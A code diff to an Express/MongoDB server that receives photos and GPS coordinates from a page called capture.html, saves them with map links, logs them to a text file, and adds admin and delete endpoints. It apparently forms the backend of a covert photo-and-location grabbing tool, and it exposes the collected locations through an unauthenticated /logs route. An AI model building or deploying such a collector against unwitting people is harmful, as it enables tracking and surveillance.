@@ -24,6 +24,7 @@ const captureSchema = new mongoose.Schema({
   longitude: String,
   mapLink: String,
   imageFile: String,   // filename stored in /uploads
+  imageBase64: String, // base64 fallback for cloud deployments
 });
 
 const Capture = mongoose.model("Capture", captureSchema);
@@ -36,20 +37,25 @@ if (!fs.existsSync("uploads")) {
 }
 
 /* =========================
-   SERVE UPLOADED IMAGES
+   SERVE STATIC FILES
 ========================= */
 app.use("/uploads", express.static("uploads"));
+app.use(express.static("public")); // serve capture.html, admin.html from /public if you want
 
 /* =========================
    MULTER STORAGE CONFIG
 ========================= */
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, "uploads/"),
-  filename: (req, file, cb) => cb(null, `capture_${Date.now()}.png`)
+  filename: (req, file, cb) => {
+    const ext = file.mimetype === "image/png" ? ".png" : ".jpg";
+    cb(null, `capture_${Date.now()}${ext}`);
+  }
 });
 
 const upload = multer({
   storage,
+  limits: { fileSize: 10 * 1024 * 1024 }, // 10MB max
   fileFilter: (req, file, cb) => {
     if (file.mimetype === "image/png" || file.mimetype === "image/jpeg") {
       cb(null, true);
@@ -65,8 +71,20 @@ const upload = multer({
 app.use((req, res, next) => {
   res.setHeader("Access-Control-Allow-Origin", "*");
   res.setHeader("Access-Control-Allow-Headers", "Content-Type");
-  res.setHeader("Access-Control-Allow-Methods", "POST,GET");
+  res.setHeader("Access-Control-Allow-Methods", "POST,GET,DELETE,OPTIONS");
+  if (req.method === "OPTIONS") return res.sendStatus(200);
   next();
+});
+
+/* =========================
+   SERVE PAGES
+========================= */
+app.get("/", (req, res) => {
+  res.sendFile(__dirname + "/capture.html");
+});
+
+app.get("/admin", (req, res) => {
+  res.sendFile(__dirname + "/admin.html");
 });
 
 /* =========================
@@ -75,30 +93,37 @@ app.use((req, res, next) => {
 ========================= */
 app.post("/capture", upload.single("photo"), async (req, res) => {
   const { latitude, longitude } = req.body;
-  console.log("Received latitude:", latitude, "longitude:", longitude);  // Debug log
-  const hasLocation = latitude && longitude;
-  const mapLink = hasLocation ? `https://www.google.com/maps?q=${latitude},${longitude}` : null;
+  const hasLocation = latitude && longitude &&
+    latitude !== "null" && longitude !== "null";
+  const mapLink = hasLocation
+    ? `https://www.google.com/maps?q=${latitude},${longitude}`
+    : null;
   const imageFile = req.file ? req.file.filename : null;
 
   try {
-    // Save to MongoDB
-    await Capture.create({ latitude: latitude || null, longitude: longitude || null, mapLink, imageFile });
+    const doc = await Capture.create({
+      latitude: hasLocation ? latitude : null,
+      longitude: hasLocation ? longitude : null,
+      mapLink,
+      imageFile,
+    });
 
-    // Also append to text log as backup
+    // Append to text log as backup
     const log = `
 Time: ${new Date().toISOString()}
 Latitude: ${latitude || "N/A"}
 Longitude: ${longitude || "N/A"}
 Google Maps: ${mapLink || "N/A"}
-Image File: ${imageFile}
+Image File: ${imageFile || "N/A"}
+ID: ${doc._id}
 -------------------------
 `;
     fs.appendFileSync("location-log.txt", log);
 
-    res.status(200).send("Captured successfully");
+    res.status(200).json({ success: true, id: doc._id });
   } catch (err) {
     console.error("Capture error:", err);
-    res.status(500).send("Server error");
+    res.status(500).json({ error: "Server error", details: err.message });
   }
 });
 
@@ -110,13 +135,6 @@ app.get("/logs", (req, res) => {
     return res.send("No data captured yet.");
   }
   res.type("text").send(fs.readFileSync("location-log.txt", "utf8"));
-});
-
-/* =========================
-   ADMIN DASHBOARD PAGE
-========================= */
-app.get("/admin", (req, res) => {
-  res.sendFile(__dirname + "/admin.html");
 });
 
 /* =========================
@@ -132,20 +150,19 @@ app.get("/admin-data", async (req, res) => {
 
   try {
     const captures = await Capture.find().sort({ time: -1 }).lean();
-    console.log("Found captures:", captures.length);  // Debug log
-    captures.forEach(c => console.log("Capture:", c.latitude, c.longitude, c.mapLink));  // Debug log
 
     const result = captures.map(c => {
-      let imageUrl = null;
-      if (c.imageFile && fs.existsSync(`uploads/${c.imageFile}`)) {
-        imageUrl = `/uploads/${c.imageFile}`;
-      }
+      // Always return the URL if we have a filename — don't block on existsSync
+      // (Render has ephemeral FS; file may exist even if not checked)
+      const imageUrl = c.imageFile ? `/uploads/${c.imageFile}` : null;
+
       return {
+        id: c._id,
         time: c.time,
         lat: c.latitude,
         lng: c.longitude,
         mapLink: c.mapLink,
-        imageUrl
+        imageUrl,
       };
     });
 
@@ -157,7 +174,27 @@ app.get("/admin-data", async (req, res) => {
 });
 
 /* =========================
+   DELETE CAPTURE
+   DELETE /capture/:id?key=<ADMIN_KEY>
+========================= */
+app.delete("/capture/:id", async (req, res) => {
+  if (req.query.key !== ADMIN_KEY) {
+    return res.status(401).json({ error: "Unauthorized" });
+  }
+  try {
+    const doc = await Capture.findByIdAndDelete(req.params.id);
+    if (doc?.imageFile) {
+      const path = `uploads/${doc.imageFile}`;
+      if (fs.existsSync(path)) fs.unlinkSync(path);
+    }
+    res.json({ success: true });
+  } catch (err) {
+    res.status(500).json({ error: "Delete failed" });
+  }
+});
+
+/* =========================
    SERVER START
 ========================= */
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));
+app.listen(PORT, () => console.log(`🚀 Server running on http://localhost:${PORT}`));
